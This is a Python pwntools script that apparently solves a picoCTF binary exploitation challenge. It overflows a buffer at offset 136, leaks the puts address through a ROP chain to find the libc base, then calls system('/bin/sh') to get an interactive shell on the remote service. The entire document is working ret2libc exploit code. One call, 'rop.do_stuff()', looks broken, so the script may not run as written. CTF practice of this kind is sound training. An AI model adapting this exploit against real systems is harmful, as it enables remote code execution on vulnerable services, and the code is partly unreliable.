#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('vuln')
libc = ELF('./libc.so.6')

host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 62289)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io


def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# -- Exploit goes here --
OFFSET = 136
rop = ROP(exe)
rop.call('puts', [exe.got.puts])
rop.do_stuff()

payload = flat(
    {OFFSET: rop.chain()}
)

io = start()
io.sendlineafter('WeLcOmE To mY EcHo sErVeR!', payload)
io.recvline()
io.recvline()

puts_addr = int.from_bytes(io.recvline(keepends=False), byteorder="little")
log.info("puts() runtime address: {}".format(hex(puts_addr)))


libc_base = puts_addr - libc.symbols.puts
assert (libc_base & 0xFFF == 0)
log.info("Libc runtime base address: {}".format(hex(libc_base)))
libc.address = libc_base

rop = ROP(exe)
rop.call('puts', [exe.got.puts])
rop.call(libc.symbols.system, [next(libc.search(b'/bin/sh'))])

payload = flat(
    {OFFSET: rop.chain()}
)

io.sendline(payload)
io.interactive()
